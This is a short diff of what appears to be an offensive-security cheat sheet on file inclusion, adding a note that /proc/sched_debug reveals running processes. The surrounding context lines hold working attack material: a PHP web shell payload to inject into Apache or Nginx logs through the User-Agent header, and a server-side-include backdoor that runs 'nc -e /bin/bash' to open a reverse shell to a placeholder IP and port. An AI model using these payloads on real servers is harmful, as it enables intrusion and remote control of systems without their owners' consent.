@@ -544,6 +544,10 @@ For apache `/var/log/apache2/access.log` try to access the log and if we can the
 
 For niginx `/var/log/nginx/error.log` try to access the log and if we can then add `<?php system($_GET['c']); ?>` in User-agent or try to add it in a file having a paramter make sure it's not being url encoded <br/>
 
+#### Proc
+
+To see list of processes running on the system we can read this file `/proc/sched_debug`
+
 ### SSI (Server Side Includes)
 
 ` echo '<!--#exec cmd="nc -e /bin/bash IP PORT" -->' > backdoor.shtml`
